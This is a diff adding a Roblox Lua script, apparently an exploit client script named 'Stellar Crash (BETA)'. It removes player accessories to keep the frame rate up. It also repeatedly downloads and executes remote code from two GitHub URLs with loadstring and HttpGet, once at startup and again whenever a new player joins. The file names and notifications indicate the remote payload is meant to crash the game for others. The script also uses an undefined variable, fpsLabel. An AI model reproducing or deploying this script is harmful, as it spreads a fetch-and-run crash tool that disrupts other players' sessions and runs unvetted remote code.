@@ -1,0 +1,107 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+
+
+-- Function to remove all accessories from all players
+local function removeAllAccessories()
+    for _, player in pairs(Players:GetPlayers()) do
+        local character = player.Character
+        if character then
+            for _, item in pairs(character:GetDescendants()) do
+                if item:IsA("Accessory") then
+                    item:Destroy()
+                end
+            end
+        end
+    end
+end
+
+-- FPS calculation variables
+local frames = 0
+local fps = 0
+local lastUpdateTime = tick()
+
+-- Function to update FPS and remove accessories instantly if FPS drops below 20
+RunService.RenderStepped:Connect(function()
+    frames = frames + 1
+
+    -- Update FPS every 0.1 seconds
+    if tick() - lastUpdateTime >= 0.1 then
+        fps = frames / (tick() - lastUpdateTime)  -- FPS calculation for 0.1s window
+        frames = 0
+        lastUpdateTime = tick()
+
+        -- Update FPS display
+        fpsLabel.Text = "FPS: " .. tostring(math.floor(fps))
+
+        -- Check if FPS is below 20 and remove accessories instantly if necessary
+        if fps < 20 then
+            removeAllAccessories()
+            StarterGui:SetCore("SendNotification", {
+                Title = "Low FPS Detected",
+                Text = "FPS dropped below 20. Accessories removed.",
+                Duration = 5
+            })
+        end
+    end
+
+    -- Continuous accessory removal for optimization
+    removeAllAccessories()
+end)
+
+-- URLs for loadstring alternation
+local loadstringUrls = {
+    "https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt",
+    "https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/c.txt"
+}
+local currentUrlIndex = 1
+
+-- Function to execute the loadstring
+local function executeStellarCrash()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(loadstringUrls[currentUrlIndex]))()
+    end)
+
+    if success then
+       print('good')
+    else
+        warn("Failed to execute the script: " .. err)
+    end
+
+    -- Alternate the URL index for the next execution
+    currentUrlIndex = currentUrlIndex == 1 and 2 or 1
+end
+
+-- Execute the loadstring once at the start
+StarterGui:SetCore("SendNotification", {
+    Title = "Stellar Crash (BETA)",
+    Text = "The crash script has been executed for the first time.",
+    Duration = 5
+})
+executeStellarCrash()
+
+-- Listen for new players joining and execute the loadstring again
+Players.PlayerAdded:Connect(function(player)
+    StarterGui:SetCore("SendNotification", {
+        Title = "New Player Joined",
+        Text = player.Name .. " joined the game, refreshing script.",
+        Duration = 5
+    })
+    wait(2) -- Wait for a bit before refreshing
+    executeStellarCrash()
+end)
+
+-- Optional: Notify when accessories are removed after respawn
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function()
+        removeAllAccessories()
+        StarterGui:SetCore("SendNotification", {
+            Title = "Accessories Removed",
+            Text = "All accessories have been removed for " .. player.Name .. ".",
+            Duration = 5
+        })
+    end)
+end)
